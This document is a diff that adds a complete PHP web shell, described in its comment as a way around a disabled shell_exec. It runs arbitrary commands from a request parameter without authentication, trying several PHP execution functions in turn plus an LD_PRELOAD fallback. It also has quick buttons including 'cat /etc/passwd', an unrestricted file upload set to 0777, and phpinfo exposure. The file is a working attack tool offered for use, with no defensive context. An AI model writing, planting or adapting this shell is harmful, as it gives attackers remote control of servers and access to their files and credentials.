@@ -1,0 +1,136 @@
+<?php
+// Bypass shell_exec yang dinonaktifkan
+header('Content-Type: text/html; charset=utf-8');
+
+function executeCommand($cmd) {
+    $methods = [
+        'proc_open' => function($c) {
+            $descriptorspec = [0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];
+            $process = proc_open($c, $descriptorspec, $pipes);
+            if(is_resource($process)) {
+                $output = stream_get_contents($pipes[1]);
+                fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
+                proc_close($process);
+                return $output;
+            }
+            return false;
+        },
+        'popen' => function($c) {
+            $handle = popen($c, 'r');
+            $output = '';
+            if(is_resource($handle)) {
+                while(!feof($handle)) $output .= fread($handle, 4096);
+                pclose($handle);
+                return $output;
+            }
+            return false;
+        },
+        'system' => function($c) {
+            ob_start();
+            system($c);
+            return ob_get_clean();
+        },
+        'passthru' => function($c) {
+            ob_start();
+            passthru($c);
+            return ob_get_clean();
+        },
+        'shell_exec' => function($c) {
+            return shell_exec($c);
+        },
+        'backticks' => function($c) {
+            return `$c`;
+        },
+        'exec' => function($c) {
+            exec($c, $output);
+            return implode("\n", $output);
+        }
+    ];
+    
+    foreach($methods as $func => $callback) {
+        if(function_exists($func)) {
+            $result = $callback($cmd);
+            if($result !== false && $result !== null) {
+                return htmlspecialchars($result);
+            }
+        }
+    }
+    
+    // Fallback: LD_PRELOAD technique
+    if(function_exists('mail')) {
+        $temp = tempnam('/tmp', 'exp');
+        file_put_contents($temp, '#!/bin/sh'."\n".$cmd);
+        chmod($temp, 0777);
+        putenv("LD_PRELOAD=".$temp);
+        mail('', '', '', '');
+        unlink($temp);
+        return "LD_PRELOAD attempt executed";
+    }
+    
+    return "All execution methods disabled";
+}
+
+// Handle command execution
+if(isset($_REQUEST['c'])) {
+    $cmd = $_REQUEST['c'];
+    echo '<pre>'.executeCommand($cmd).'</pre>';
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Shell</title>
+    <style>
+        body { background: #111; color: #0f0; font-family: monospace; }
+        input, textarea { background: #222; color: #0f0; border: 1px solid #0f0; }
+        button { background: #0a0; color: #000; border: none; padding: 5px 15px; }
+    </style>
+</head>
+<body>
+    <h2>PHP Web Shell</h2>
+    <form method="POST">
+        <input type="text" name="c" value="<?php echo isset($_POST['c']) ? htmlspecialchars($_POST['c']) : 'id; pwd; ls -la'; ?>" size="80">
+        <button type="submit">Execute</button>
+    </form>
+    
+    <hr>
+    
+    <h3>Quick Commands:</h3>
+    <form method="POST">
+        <button name="c" value="whoami">whoami</button>
+        <button name="c" value="pwd">pwd</button>
+        <button name="c" value="ls -la">ls -la</button>
+        <button name="c" value="uname -a">uname -a</button>
+        <button name="c" value="cat /etc/passwd">cat /etc/passwd</button>
+    </form>
+    
+    <hr>
+    
+    <h3>File Upload:</h3>
+    <form method="POST" enctype="multipart/form-data">
+        <input type="file" name="file">
+        <button type="submit" name="upload">Upload</button>
+    </form>
+    
+    <?php
+    if(isset($_FILES['file'])) {
+        $target = basename($_FILES['file']['name']);
+        if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+            echo "File uploaded: $target<br>";
+            chmod($target, 0777);
+        }
+    }
+    ?>
+    
+    <hr>
+    
+    <h3>PHP Info:</h3>
+    <a href="?info=1">Show PHP Info</a>
+    <?php
+    if(isset($_GET['info'])) {
+        phpinfo();
+    }
+    ?>
+</body>
+</html>
